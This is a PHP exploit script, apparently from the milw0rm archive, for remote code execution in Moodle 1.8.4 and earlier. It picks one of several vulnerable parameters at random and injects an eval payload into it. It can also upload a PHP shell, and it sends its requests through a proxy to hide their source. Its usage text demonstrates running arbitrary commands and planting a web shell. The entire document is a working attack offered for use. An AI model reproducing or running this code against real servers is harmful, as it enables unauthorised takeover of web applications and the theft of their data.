<?php
/**
 * Moodle <= 1.8.4 remote code execution
 */
$url = 'http://target.ru/moodle';
$proxy = 'localhost:8118';

$code = $argv[1];
if(!$code) {
	echo 'Sample use:
		'.$argv[0].' "phpinfo()" > phpinfo.html
		'.$argv[0].' "echo `set`"
		'.$argv[0].' /full/local/path/to/file/for/upload/php_shell.php
	';
	exit;
}
$upload = false;
if(file_exists($code) && is_file($code)) {
	$upload = $code;
	$code = 'move_uploaded_file($_FILES[file][tmp_name], basename($_FILES[file][name]))';
}
$code .= ';exit;';

$injection_points = array(
	'blocks/rss_client/block_rss_client_error.php' => array('error'),
	'course/scales.php?id=1' => array('name', 'description'),
	'help.php' => array('text'),
	'login/confirm.php' => array('data', 's'),
	'mod/chat/gui_basic/index.php?id=1' => array('message'),
	'mod/forum/post.php' => array('name'),
	'mod/glossary/approve.php?id=1' => array('hook'),
	'mod/wiki/admin.php' => array('page'),
);
$file = array_rand($injection_points);
$param = $injection_points[$file][array_rand($injection_points[$file])];
$value = '<img src=http&{${eval($_POST[cmd])}};://target.ru>';

$post_data = array($param=>$value, 'cmd'=>$code);
if($upload) {
	echo "Check at:\n\t\t".$url.'/'.dirname($file).'/'.basename($upload)."\n";
	$post_data["file"] = '@'.$upload;
}

$c = curl_init();
curl_setopt($c, CURLOPT_URL, $url.'/'.$file);
curl_setopt($c, CURLOPT_PROXY, $proxy);
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_HEADER, false);
echo curl_exec($c);
curl_close($c);
?>

# milw0rm.com [2008-09-03]
